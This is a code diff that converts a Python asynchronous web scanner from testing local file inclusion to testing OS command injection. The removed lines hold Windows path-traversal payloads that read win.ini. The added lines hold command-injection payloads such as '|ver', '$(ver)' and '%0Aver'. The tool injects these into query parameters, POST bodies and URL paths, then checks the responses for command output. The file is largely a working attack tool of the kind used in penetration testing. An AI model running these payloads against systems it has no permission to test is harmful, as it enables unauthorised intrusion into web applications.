@@ -11,41 +11,27 @@ from colorama import init, Fore
 init(autoreset=True)
 
 # Configuration
-LFI_PAYLOADS = [
-    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini&?",
-    "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini&?",
-    "/./././././././././././windows/win.ini&?",
-    "/../../../../../../../../../../../windows/win.ini&?",
-#    "/..\../..\../..\../..\../..\../..\../windows/win.ini&?",
-#    "/.\\./.\\./.\\./.\\./.\\./.\\./windows/win.ini&?",
-#    "..//..//..//..//..//windows//win.ini&?",
-#    "../../../../../../../../../../../../windows/win.ini&?",
-#    "../../windows/win.ini&?",
-#    "..\../..\../..\../..\../windows/win.ini&?",
-#    "..\../..\../windows/win.ini&?",
-#    "..\..\..\..\..\..\..\..\..\..\windows\win.ini&?",
-#    "\..\..\..\..\..\..\..\..\..\..\windows\win.ini&?",
-#    "/../../../../../../../../../../../windows/win.ini%00&?",
-#    "../../../../../../../../../../../../windows/win.ini%00&?",
-#    "..\..\..\..\..\..\..\..\..\..\windows\win.ini%00&?",
-#    "/../../../../../../../../../../../windows/win.ini%00.html&?",
-#    "/../../../../../../../../../../../windows/win.ini%00.jpg&?",
-#    "..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../windows/win.ini&?",
-#    "../../../../../../../../windows/win.ini&?",
-#    "..\..\..\..\..\..\..\..\windows\win.ini&?",
-#    "c:\windows\win.ini&?",
-#    "c:/windows/win.ini&?",
-#    "php://filter/zlib.deflate/convert.base64-encode/resource=c:/windows/win.ini&?",
-#    "php://filter/zlib.deflate/convert.base64-encode/resource=c:\windows\win.ini&?"
+OSI_PAYLOADS = [
+    "ver",
+    "|ver",
+    ";ver",
+    "&ver",
+    "&&ver",
+    "||ver",
+    "%0Aver",
+    "%0Dver",
+    "%0D%0Aver",
+    "`ver`",
+    "$(ver)"
 ]
-DEFAULT_TIMEOUT = 10
+DEFAULT_TIMEOUT = 50
 
 # Concurrency limit for async tasks
 SEMAPHORE_LIMIT = 5  # You can adjust this value based on your system's capacity
 
-async def inject_lfi_payload(session, request, semaphore):
+async def inject_osi_payload(session, request, semaphore):
     """
-    Inject LFI payloads into the request and test for vulnerabilities, including path-based LFI.
+    Inject osi payloads into the request and test for vulnerabilities, including path-based osi.
     
     Args:
         session: The HTTPX session.
@@ -68,7 +54,7 @@ async def inject_lfi_payload(session, request, semaphore):
         # Test GET requests with query parameters
         if method == "GET" and query_params:
             for param, values in query_params.items():
-                for payload in LFI_PAYLOADS:
+                for payload in OSI_PAYLOADS:
                     modified_params = query_params.copy()
                     modified_params[param] = [payload for value in values]
                     new_query_string = "&".join(
@@ -76,24 +62,24 @@ async def inject_lfi_payload(session, request, semaphore):
                     )
                     new_url = urljoin(url, f"{parsed_url.path}?{new_query_string}")
 
-                    result = await test_lfi(session, new_url, method, headers=headers)
-                    if result and result["lfi_detected"]:
+                    result = await test_osi(session, new_url, method, headers=headers)
+                    if result and result["osi_detected"]:
                         result["query_params"] = query_params  # Original query parameters
                         result["modified_query_params"] = modified_params  # Modified query parameters
                         result["payload"] = payload  # The payload used
                         results.append(result)
-                        break  # Break after detecting LFI and move to the next request
+                        break  # Break after detecting osi and move to the next request
 
         # Test POST requests with payloads
         elif method == "POST" and body:
-            for payload in LFI_PAYLOADS:
+            for payload in OSI_PAYLOADS:
                 if isinstance(body, str):
                     modified_body = body + payload
                     logging.debug(f"Modified body size (str): {len(modified_body)}")
                     headers.pop("Content-Length", None)
                     headers["Transfer-Encoding"] = "chunked"  # Add chunked encoding
                 elif isinstance(body, dict):
-                    modified_body = {key: value + payload for key, value in body.items()}
+                    modified_body = {key: payload for key, value in body.items()}
                     body_str = json.dumps(modified_body)
                     logging.debug(f"Modified body size (dict): {len(body_str)}")
                     headers.pop("Content-Length", None)
@@ -106,47 +92,47 @@ async def inject_lfi_payload(session, request, semaphore):
 
                 # Send the request with the modified body
                 try:
-                    result = await test_lfi(session, url, method, headers=headers, data=modified_body)
-                    if result and result["lfi_detected"]:
+                    result = await test_osi(session, url, method, headers=headers, data=modified_body)
+                    if result and result["osi_detected"]:
                         result["post_data"] = body  # Original POST data
                         result["modified_post_data"] = modified_body  # Modified POST data with payload
                         result["payload"] = payload  # The payload used
                         results.append(result)
-                        break  # Break after detecting LFI and move to the next request
+                        break  # Break after detecting osi and move to the next request
                 except Exception as e:
-                    logging.error(f"Error while testing LFI payload: {e}")
+                    logging.error(f"Error while testing osi payload: {e}")
                     continue
 
-        # Path-Based LFI Detection (only modify path)
+        # Path-Based osi Detection (only modify path)
         if method == "GET":
             path_parts = parsed_url.path.split('/')
 
             # Look for path segments that could be vulnerable
             for i, part in enumerate(path_parts):
                 if part:  # Only modify non-empty path segments
-                    for payload in LFI_PAYLOADS:
-                        path_parts[i] = part + payload
+                    for payload in OSI_PAYLOADS:
+                        path_parts[i] = payload
                         modified_path = '/'.join(path_parts)
                         new_url = urlparse(url)._replace(path=modified_path).geturl()
 
                         # Send the request with the modified path
                         try:
-                            result = await test_lfi(session, new_url, method, headers=headers)
-                            if result and result["lfi_detected"]:
+                            result = await test_osi(session, new_url, method, headers=headers)
+                            if result and result["osi_detected"]:
                                 result["path"] = parsed_url.path  # Original path
                                 result["modified_path"] = modified_path  # Modified path with payload
                                 result["payload"] = payload  # The payload used
                                 results.append(result)
-                                break  # Break after detecting LFI and move to the next request
+                                break  # Break after detecting osi and move to the next request
                         except Exception as e:
-                            logging.error(f"Error while testing path-based LFI payload: {e}")
+                            logging.error(f"Error while testing path-based osi payload: {e}")
                         path_parts[i] = part  # Reset path segment after testing
 
     return results
 
-async def test_lfi(session, url, method, headers=None, data=None):
+async def test_osi(session, url, method, headers=None, data=None):
     """
-    Send an HTTP request and test for LFI vulnerabilities.
+    Send an HTTP request and test for osi vulnerabilities.
     
     Args:
         session: The HTTPX session.
@@ -156,25 +142,25 @@ async def test_lfi(session, url, method, headers=None, data=None):
         data: Optional data for POST requests.
     
     Returns:
-        A dictionary with the test results or None if no LFI is detected.
+        A dictionary with the test results or None if no osi is detected.
     """
     try:
         response = await session.request(method, url, headers=headers, data=data, timeout=DEFAULT_TIMEOUT)
 
-        for payload in LFI_PAYLOADS:
-            if re.search(r'\[fonts\]', response.text):  # Check for win.ini file
+        for payload in OSI_PAYLOADS:
+            if re.search(r'Microsoft Windows \[Version', response.text):  # Check for passwd file
                 return {
                     "url": url,
                     "method": method,
                     "status_code": response.status_code,
-                    "lfi_detected": True,
+                    "osi_detected": True,
                     "payload": payload
                 }
         return {
             "url": url,
             "method": method,
             "status_code": response.status_code,
-            "lfi_detected": False
+            "osi_detected": False
         }
     except httpx.RequestError as e:
         logging.error(f"Error testing {url} with payload: {data}. Exception: {e}")
@@ -182,7 +168,7 @@ async def test_lfi(session, url, method, headers=None, data=None):
             "url": url,
             "method": method,
             "status_code": "Error",
-            "lfi_detected": False,
+            "osi_detected": False,
             "error": str(e)
         }
     except Exception as e:
@@ -191,23 +177,23 @@ async def test_lfi(session, url, method, headers=None, data=None):
             "url": url,
             "method": method,
             "status_code": "Error",
-            "lfi_detected": False,
+            "osi_detected": False,
             "error": str(e)
         }
 
 async def process_requests(requests):
     """
-    Process all requests from requests.json and check for LFI vulnerabilities.
+    Process all requests from requests.json and check for osi vulnerabilities.
     
     Args:
         requests: A list of request dictionaries.
     
     Returns:
-        A list of results from the LFI tests.
+        A list of results from the osi tests.
     """
     semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)  # Limit concurrent tasks
     async with httpx.AsyncClient() as session:
-        tasks = [inject_lfi_payload(session, request, semaphore) for request in requests]
+        tasks = [inject_osi_payload(session, request, semaphore) for request in requests]
         results = await asyncio.gather(*tasks)
         return [item for sublist in results for item in sublist]  # Flatten the results
 
@@ -229,7 +215,7 @@ def save_results(results, output_file):
     Save results to a JSON file.
     
     Args:
-        results: List of results from the LFI tests.
+        results: List of results from the osi tests.
         output_file: Path to the output file.
     """
     with open(output_file, 'w') as f:
@@ -248,29 +234,29 @@ def print_results(results):
     Print results in a formatted table.
     
     Args:
-        results: List of results from the LFI tests.
+        results: List of results from the osi tests.
     """
-    # Filter results to only show detected LFI vulnerabilities
-    lfi_results = [result for result in results if result["lfi_detected"]]
+    # Filter results to only show detected osi vulnerabilities
+    osi_results = [result for result in results if result["osi_detected"]]
 
-    if not lfi_results:
-        print(Fore.YELLOW + "No LFI vulnerabilities detected.")
+    if not osi_results:
+        print(Fore.YELLOW + "No osi vulnerabilities detected.")
         return
 
     table_data = []
-    for result in lfi_results:
+    for result in osi_results:
         table_data.append([
             result["url"],
             result["method"],
             result["status_code"],
-            Fore.RED + "LFI Detected"
+            Fore.RED + "osi Detected"
         ])
-    headers = ["URL", "Method", "Status Code", "LFI Detection"]
+    headers = ["URL", "Method", "Status Code", "osi Detection"]
     print(tabulate(table_data, headers, tablefmt="grid", stralign="center"))
 
 async def main(input_file, output_file):
     """
-    Main function to orchestrate the LFI detection process.
+    Main function to orchestrate the osi detection process.
     
     Args:
         input_file: Path to the input JSON file.
@@ -280,11 +266,11 @@ async def main(input_file, output_file):
     logging.info(f"Loaded {len(requests)} requests for testing.")
 
     results = await process_requests(requests)
-    # Filter results to only include LFI detections
-    lfi_results = [result for result in results if result["lfi_detected"]]
+    # Filter results to only include osi detections
+    osi_results = [result for result in results if result["osi_detected"]]
 
-    print_results(lfi_results)
-    save_results(lfi_results, output_file)
+    print_results(osi_results)
+    save_results(osi_results, output_file)
     signal.signal(signal.SIGINT, save_output_on_exit)
 
 if __name__ == "__main__":
@@ -296,9 +282,9 @@ if __name__ == "__main__":
     signal.signal(signal.SIGINT, save_output_on_exit)
 
     # Command-line argument parsing
-    parser = argparse.ArgumentParser(description="LFI Detection Tool")
+    parser = argparse.ArgumentParser(description="osi Detection Tool")
     parser.add_argument("--input", default="requests.json", help="Input file with requests (default: requests.json)")
-    parser.add_argument("--output", default="lfi_windows.json", help="Output file for results (default: lfi_windows.json)")
+    parser.add_argument("--output", default="results_osi_win.json", help="Output file for results (default: results_osi_win.json)")
     parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
     args = parser.parse_args()
 
